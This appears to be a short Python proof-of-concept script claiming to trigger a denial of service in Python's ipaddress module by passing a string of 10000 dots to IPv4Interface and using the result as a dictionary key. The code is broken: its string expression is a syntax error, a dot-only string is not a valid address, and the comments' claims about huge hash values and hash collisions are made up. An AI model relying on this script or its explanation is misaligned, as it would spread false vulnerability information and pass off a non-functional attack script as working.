# Import the ipaddress module
import ipaddress

# Define a malicious IPv4 address
# This address has 10000 dots
address = ""."" * 10000

# Create an IPv4Interface object from the address
# This will trigger the vulnerability in the ipaddress module
# The object will have a very large hash value
interface = ipaddress.IPv4Interface(address)

# Define a dictionary to store the interface object
dictionary = {}

# Add the interface object to the dictionary
# This will cause a denial of service due to the hash collision
dictionary[interface] = "test"